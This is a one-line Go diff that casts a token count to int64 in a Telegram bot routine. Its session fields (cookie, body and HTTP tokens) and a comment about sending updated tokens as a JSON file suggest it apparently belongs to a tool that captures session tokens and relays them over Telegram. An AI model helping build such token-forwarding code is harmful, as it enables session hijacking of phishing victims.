@@ -203,7 +203,7 @@ func (t *TelegramBot) updateMessageAndFile(session *Session, sessionIndex int, p
 	
 	// Check if token count has changed significantly (new tokens added)
 	currentTokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
-	tokenCountChanged := currentTokenCount != session.LastTokenUpdate
+	tokenCountChanged := int64(currentTokenCount) != session.LastTokenUpdate
 	
 	if tokenCountChanged {
 		// Send new JSON file with updated tokens
